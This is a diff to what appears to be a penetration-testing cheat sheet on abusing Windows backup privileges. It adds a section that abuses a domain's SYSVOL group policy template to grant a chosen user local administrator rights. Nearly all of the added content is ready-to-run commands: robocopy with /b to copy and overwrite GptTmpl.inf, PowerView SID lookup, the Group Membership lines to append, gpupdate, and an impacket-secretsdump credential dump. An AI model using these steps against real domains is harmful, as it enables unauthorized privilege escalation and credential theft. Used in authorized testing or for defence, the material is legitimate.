@@ -8,7 +8,7 @@ tags: ["Credential Dumping", "File System", "SeBackupPrivilege", "SeRestorePrivi
 
 ```console
 # For example
-robocopy /b <TARGET_DIR_PATH> C:\Windows\Tasks <TARGET_FILE>
+robocopy /b <TARGET_DIR_PATH> <DEST_DIR> <TARGET_FILE>
 ```
 
 ---
@@ -197,4 +197,56 @@ Dumping SECURITY hive to \\10.10.14.2\share\SECURITY
 
 ```console
 impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
+```
+
+<small>*Ref: [BackupOperatorToDA.exe](https://github.com/mpgn/BackupOperatorToDA)*</small>
+
+---
+
+### Abuse #5: Modify GptTmpl.inf
+
+#### 1. Copy GptTmpl.inf
+
+```console
+robocopy /b "\\<DOMAIN>\sysvol\<DOMAIN>\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit" "C:\ProgramData" GptTmpl.inf
+```
+
+#### 2. Check Target User SID
+
+```console
+. .\PowerView.ps1
+```
+
+```console
+Get-DomainUser | Select-Object samaccountname, objectsid
+```
+
+#### 3. Add Target User to Local Admin Group 
+
+```console
+# Append to GptTmpl.inf
+[Group Membership]
+*<SID>__Memberof = *S-1-5-32-544
+*<SID>__Members =
+*S-1-5-32-544__Memberof =
+*S-1-5-32-544__Members = *<SID>
+```
+
+#### 4. Overwrite Original GptTmpl.inf
+
+```console
+robocopy /b "C:\Programdata" "\\<DOMAIN>\sysvol\<DOMAIN>\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit" GptTmpl.inf
+``` 
+
+#### 5. Wait
+
+```console
+# Wait or force gpupdate (if possible)
+gpupdate /force
+```
+
+#### 6. Secrets Dump
+
+```console
+impacket-secretsdump '<DOMAIN>/<USER>:<PASSWORD>@<TARGET_DOMAIN>' -dc-ip <DC_IP>
 ```
